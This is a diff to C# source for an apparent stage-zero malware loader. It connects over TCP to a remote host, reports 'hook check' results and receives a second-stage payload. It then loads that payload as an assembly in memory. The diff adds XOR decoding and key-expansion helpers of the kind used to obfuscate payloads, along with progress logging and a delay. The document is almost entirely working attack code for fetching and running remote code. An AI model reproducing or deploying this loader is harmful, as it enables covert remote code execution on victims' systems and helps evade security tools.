@@ -6,6 +6,8 @@ using System.Linq;
 using System.Collections.Generic;
 using System.Net.Sockets;
 using System.Reflection;
+using System.Text;
+using System.Text.RegularExpressions;
 
 namespace Stage0
 {
@@ -91,6 +93,27 @@ namespace Stage0
             SendData(_host, Convert.ToInt32(_port), HookChecks);
         }
 
+        public static string ExpandString(string str, int length)
+        {
+            var result = new StringBuilder(length, length);
+            var whole = length / str.Length;
+            for (var i = 0; i < whole; i++)
+            {
+                result.Append(str);
+            }
+            result.Append(str, 0, length % str.Length);
+            return result.ToString();
+        }
+
+        public static byte[] exclusiveOR(byte[] key, byte[] str)
+        {
+            for (int i = 0; i < str.Length; i++)
+            {
+                str[i] = (byte)(str[i] ^ key[i]);
+            }
+            return str;
+        }
+
         static void SendData(string server, int port, byte[] message)
         {
             try
@@ -120,20 +143,24 @@ namespace Stage0
 
                 MemoryStream memstream = new MemoryStream();
                 int bytes = 0;
+                
                 do
                 {
                     bytes = stream.Read(data, 0, data.Length);
+                    Console.WriteLine("[<] Receiving {0} bytes from the server", bytes);
                     memstream.Write(data, 0, bytes);
+                    System.Threading.Thread.Sleep(1000);
                 }
                 while (stream.DataAvailable);
 
                 // Read the first batch of the TcpServer response bytes.
-                byte[] stage1Bytes = memstream.ToArray();
+                byte[] stage1Bytes = memstream.ToArray();               
                 Console.WriteLine("[+] Recieved {0} bytes from the server!", stage1Bytes.Length);
-                LoadAssembly(stage1Bytes);
+                
 
                 // Close everything.
                 stream.Close();
+                LoadAssembly(stage1Bytes);
                 client.Close();
             }
             catch (ArgumentNullException e)
